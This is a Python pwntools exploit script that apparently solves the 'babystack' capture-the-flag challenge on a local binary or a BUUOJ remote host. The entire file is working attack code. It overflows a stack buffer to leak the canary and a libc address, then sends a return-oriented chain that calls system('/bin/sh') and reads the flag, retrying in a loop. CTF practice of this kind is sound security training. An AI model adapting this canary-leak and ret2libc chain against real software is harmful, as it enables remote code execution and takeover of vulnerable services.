import sys
from pwn import *
context.log_level='debug'
context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./babystack')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./babystack')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',28954)
			elf=ELF('./babystack')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')


		io.sendlineafter('>> ','1')
		sleep(0.1)
		pay='a'*0x89#+p64(0x0000000000400a93)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(0x400720)
		io.send(pay)
		io.sendlineafter('>> ','2')
		sleep(0.1)
		can=u64('\x00'+io.recv(0x90)[-7:])
		io.sendlineafter('>> ','1')
		pay='a'*0x98#+p64()+p64(0x0000000000400a93)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(0x400720)
		io.send(pay)
		sleep(0.1)
		io.sendlineafter('>> ','2')
		libc_base=u64(io.recv(0xa0)[-8:-2]+'\x00\x00')-libc.sym['__libc_start_main']-240
		libc.address=libc_base
		io.sendlineafter('>> ','1')

		sleep(0.1)
		pay='a'*0x88+p64(can)+p64(1)+p64(0x0000000000400a93)+p64(libc.search('/bin/sh\x00').next())+p64(libc.sym['system'])+p64(0x400720)
		io.send(pay)
		io.sendlineafter('>> ','3')
		sleep(0.1)
		io.sendline('cat flag\n')
		data=io.recvline()
		if 'flag' in data :
			print data
		else :
			io.close()
			continue




		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue